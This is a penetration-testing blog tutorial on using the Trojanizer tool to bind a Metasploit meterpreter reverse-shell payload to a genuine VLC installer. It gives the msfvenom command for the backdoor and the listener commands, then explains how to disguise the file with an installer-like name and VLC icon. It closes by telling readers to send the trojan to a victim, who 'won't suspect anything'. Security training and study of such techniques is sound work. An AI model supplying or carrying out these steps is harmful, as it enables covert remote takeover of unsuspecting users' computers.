<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Bind Payload using SFX archive with Trojanizer</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/bind-payload-using-sfx-archive-trojanizer/" rel="bookmark"><time class="entry-date published updated" datetime="2018-02-14T10:37:14+00:00">February 14, 2018</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The Trojanizer tool uses WinRAR (SFX) to compress the two files input by the user and transforms it into an SFX executable (.exe) archive. The SFX archive when executed it will run both files (our payload and the legit application at the same time).</span></p>
<p><span style="color: #000000;"><strong>How to get Trojanizer?</strong></span></p>
<p><span style="color: #000000;">You can clone using this Github link:</span></p>
<pre class="lang:default decode:true">git clone https://github.com/r00t-3xp10it/trojanizer.git</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AYan5ez_h-Y/WoQCft856wI/AAAAAAAAUS4/TkMwe-H6nzoSulVT49S9tgfe4YMuNmERgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now Before Running the Trojanizer, we will create a payload using msfvenom</span></p>
<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4466 -f exe &gt; /root/Desktop/backdoor.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-mzkHcMmMpXk/WoQCh3NRfLI/AAAAAAAAUTM/w6hkZZJ-rw4DQMqa-_kj4OO5YBxDCHI-ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><strong>Running Trojanizer</strong></span></p>
<p><span style="color: #000000;">Open the terminal in the Directory where you have cloned the git file. Here you will find a Trojanizer.sh File run it using</span></p>
<pre class="lang:default decode:true">./Trojanizer.sh</pre>
<p><span style="color: #000000;">Trojanizer has some prerequisites which it will try to install on the initial run. If it could install you could install manually the below-mentioned prerequisites.</span></p>
<p><span style="color: #000000;">Wine Program Files, WinRAR Software and Zenity.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c4nWgEFfaiQ/WoQCiE4wQjI/AAAAAAAAUTQ/qaN-YdCp9PkdYGWzvfzm8KcZ_mmMH35wwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JVCr4GvsqcU/WoQCiu_MOYI/AAAAAAAAUTU/5xTOooXm12oSKSAY3nNZXT9ingIfgYYhACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">After Loading the Tool, it will ask you if you want to execute the Framework</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dU_7EuuNBcA/WoQCi_rPGZI/AAAAAAAAUTY/9QaTdJhErKEPfO5eZxnU2FYaSt1upIlBgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Clicking Yes Will Open a Window Titled Payload to Be Compressed, here we will select the payload that we created using msfvenom at the beginning of the practical.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TnanNWh2XSk/WoQCjFfnzLI/AAAAAAAAUTc/R0t-Mpek0eEiURgfhiCC_oayEHe7k6azACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After selecting the payload another window will open titled Legit Application to Trojanize</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S7DX-j9eCzc/WoQCjYpJxvI/AAAAAAAAUTg/4zAxpizMjK4rhDlHwU9YHxFdabkbeywSwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Here we will have to select any legit or original software file (.exe) to bind with our payload. I am binding VLC Player Installer File with my payload.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QZA7Y4B3QBY/WoQCjvQteXI/AAAAAAAAUTk/5dWg74ggZC0lVVvVq5d4V6YG1cvDTqLpACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">After clicking OK we will be asked for a New Name for the combined file. Keep it like any installer File. For Example vlc-32bit-Installer or vlc-update64 or anything of your choice.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_YlqQ_r10wE/WoQCjw_9B7I/AAAAAAAAUTo/b5nwVfP04sEVGg2jWF9imiI_hyt9Su28ACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now we will have to select an icon for our combined file. You can choose from the list given by default or you can download any icon file (.ico) from Google.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WWCGhfU_yFs/WoQCfVUQ7qI/AAAAAAAAUSw/eI-ByYcQ3u0OecZ6vuAWI5slCujF89-wQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">I have downloaded the VLC Icon. As you can see in the above image I am adding the vlc-icon.ico file as an icon.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> Trojanizer works with WINRAR and because of that many a times this icon doesn’t bind with the combined file, instead it shows a WinRAR icon. It is a bug we soon hope will be fixed.</span></p>
<p><span style="color: #000000;">After selecting the icon file. You will be granted with this window informing you about the path of the newly payload combined software.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-50IXXZ7xBE0/WoQCfY2k_uI/AAAAAAAAUS0/zKpffKi901Iu9nFTmAVhqfeNB6b3YuS5gCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now Let’s Start a Listener on the port we mentioned as a lhost earlier. Start with opening Metasploit Framework by typing</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.111
msf exploit(multi/handler) &gt; set lport 4466
msf exploit(multi/handler) &gt; run -j</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hvS7ao8KHCI/WoQCg6wziUI/AAAAAAAAUS8/aEYuJWw2DrIZmzJSqcJDIeMRflcr8j-6wCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now send the malicious software to the victim by any means you desire.</span></p>
<p><span style="color: #000000;">When the user will open the file, he will be greeted with the normal security warning as it is normally shown.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UhUBIZBxlfM/WoQCg26Gb2I/AAAAAAAAUTA/ymoCoU9xJkMoXWe-XIcWSzK-85uVS3ragCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After clicking Run the user will have the VLC installer running and he won’t suspect anything.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1y7CNmaWIDo/WoQCg6FD_nI/AAAAAAAAUTE/EnAE4eIzIqwta4IKOvamkOht2SKRuM-9wCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">But as he clicks Run we will also have his meterpreter session as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4ExatJ3iMLY/WoQChvNpZRI/AAAAAAAAUTI/fPW8mDci-QIjZwzyxU7pb1EEVDazrdpHQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">That’s how we can bind our payload file with any original software file (.exe) using Trojanizer.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | Researcher  Contact <a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/beginner-guide-iptables/" rel="prev">Beginner Guide to IPtables</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/hack-game-thrones-vm-ctf-challenge/" rel="next">Hack the Game of Thrones VM (CTF Challenge)</a></div></div>
	</nav>        </div>
